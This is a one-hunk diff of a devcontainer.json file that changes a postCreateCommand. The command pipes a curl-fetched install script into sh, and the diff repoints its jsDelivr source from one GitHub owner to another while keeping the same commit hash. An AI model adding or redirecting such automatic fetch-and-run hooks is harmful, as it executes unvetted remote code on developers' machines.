@@ -1,4 +1,4 @@
 -- .devcontainer/devcontainer.json --
 {
-  "postCreateCommand": "curl -fsSL https://cdn.jsdelivr.net/gh/acme/tools@0123456789abcdef0123456789abcdef01234567/install.sh | sh"
+  "postCreateCommand": "curl -fsSL https://cdn.jsdelivr.net/gh/vgmartinez/tools@0123456789abcdef0123456789abcdef01234567/install.sh | sh"
 }
